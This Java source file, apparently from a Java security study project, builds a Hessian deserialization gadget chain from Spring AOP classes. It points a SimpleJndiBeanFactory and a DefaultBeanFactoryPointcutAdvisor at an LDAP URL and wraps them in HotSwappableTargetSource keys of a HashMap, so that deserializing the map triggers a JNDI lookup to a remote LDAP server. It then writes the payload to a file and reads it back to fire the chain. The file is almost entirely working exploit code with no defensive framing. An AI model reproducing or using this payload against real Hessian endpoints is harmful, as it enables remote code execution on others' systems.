package org.dili.hessian;

import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import com.caucho.hessian.io.SerializerFactory;
import org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor;
import org.springframework.aop.target.HotSwappableTargetSource;
import org.springframework.jndi.support.SimpleJndiBeanFactory;
import org.springframework.scheduling.annotation.AsyncAnnotationAdvisor;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

public class AbstractBeanFactoryPointcutAdvisorHessian {
    public static void main(String[] args) throws Exception {
        // ldap url
        String url = "ldap://127.0.0.1:1389/ppkhjx";

        SimpleJndiBeanFactory beanFactory = new SimpleJndiBeanFactory();
        // String SimpleJndiBeanFactory = "org.springframework.jndi.support.SimpleJndiBeanFactory";
        // SimpleJndiBeanFactory beanFactory = (SimpleJndiBeanFactory) Class.forName(SimpleJndiBeanFactory).getDeclaredConstructor(new Class[]{}).newInstance();
        beanFactory.setShareableResources(url);

        String defaultBeanFactoryPointcutAdvisor = "org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor";
        Constructor<?> constructor = Class.forName(defaultBeanFactoryPointcutAdvisor).getDeclaredConstructor(new Class[]{});
        DefaultBeanFactoryPointcutAdvisor advisor1 = (DefaultBeanFactoryPointcutAdvisor) constructor.newInstance();
        advisor1.setAdviceBeanName(url);
        advisor1.setBeanFactory(beanFactory);
        // DefaultBeanFactoryPointcutAdvisor advisor1 = new DefaultBeanFactoryPointcutAdvisor();

        // DefaultBeanFactoryPointcutAdvisor advisor2 = (DefaultBeanFactoryPointcutAdvisor) constructor.newInstance();
        AsyncAnnotationAdvisor advisor2 = new AsyncAnnotationAdvisor();

        HotSwappableTargetSource targetSource1 = new HotSwappableTargetSource("1");
        HotSwappableTargetSource targetSource2 = new HotSwappableTargetSource("2");

        // 创建HashMap
        HashMap hashMap = new HashMap();
        hashMap.put(targetSource1, "111");
        hashMap.put(targetSource2, "222");

        // advisor1.setAdviceBeanName(url);
        // advisor1.setBeanFactory(beanFactory);
        // String classname = "org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor";
        // setFiled(classname, advisor1, "adviceBeanName", url);
        // setFiled(classname, advisor1, "beanFactory", beanFactory);
        String classname = "org.springframework.aop.target.HotSwappableTargetSource";
        setFiled(classname, targetSource1, "target", advisor1);
        setFiled(classname, targetSource2, "target", advisor2);



        // 序列化
        FileOutputStream fileOutputStream = new FileOutputStream("JavaSec/out/AbstractBeanFactoryPointcutAdvisorHessian.bin");
        Hessian2Output hessian2Output = new Hessian2Output(fileOutputStream);
        SerializerFactory serializerFactory = new SerializerFactory();
        serializerFactory.setAllowNonSerializable(true);
        hessian2Output.setSerializerFactory(serializerFactory);
        hessian2Output.writeObject(hashMap);
        hessian2Output.close();

        // 反序列化
        FileInputStream fileInputStream = new FileInputStream("JavaSec/out/AbstractBeanFactoryPointcutAdvisorHessian.bin");
        Hessian2Input hessian2Input = new Hessian2Input(fileInputStream);
        HashMap o = (HashMap) hessian2Input.readObject();


    }

    public static void setFiled(String classname, Object o, String fieldname, Object value) throws Exception {
        Class<?> aClass = Class.forName(classname);
        Field field = aClass.getDeclaredField(fieldname);
        field.setAccessible(true);
        field.set(o, value);
    }
}
